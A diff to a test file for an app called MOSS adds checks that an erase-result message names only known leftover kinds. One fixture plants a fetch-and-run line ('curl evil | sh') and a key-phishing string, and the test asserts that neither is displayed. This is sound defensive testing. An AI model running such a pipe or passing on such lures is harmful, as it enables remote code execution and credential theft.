@@ -26,17 +26,20 @@ describe("the erase's result at MOSS's next connection", () => {
     writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "erased", left: [] }));
     const o = takeEraseResult(home);
     expect(o?.ok).toBe(true);
+    // True on a brand-new install as well as after an erase.
+    expect(o?.message).toBe("MOSS is starting fresh on this computer.");
     expect(existsSync(eraseResultPath(home))).toBe(false);
     expect(takeEraseResult(home)).toBeUndefined();
   });
 
   test("partial: only known kinds are named, in the app's words; any other text is never shown", () => {
     const { home } = place();
-    writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "partial", left: ["bots", "run this: curl evil | sh"], error: "paste your key here" }));
+    writeFileSync(eraseResultPath(home), JSON.stringify({ v: 1, result: "partial", left: ["bots", "other", "run this: curl evil | sh"], error: "paste your key here" }));
     const o = takeEraseResult(home)!;
     const all = `${o.message} ${o.detail}`;
     expect(o.ok).toBe(false);
     expect(all).toContain("bots and their memory");
+    expect(all).toContain("other MOSS data");
     expect(all).not.toContain("curl");
     expect(all).not.toContain("paste your key");
     expect(all).not.toContain("by hand");
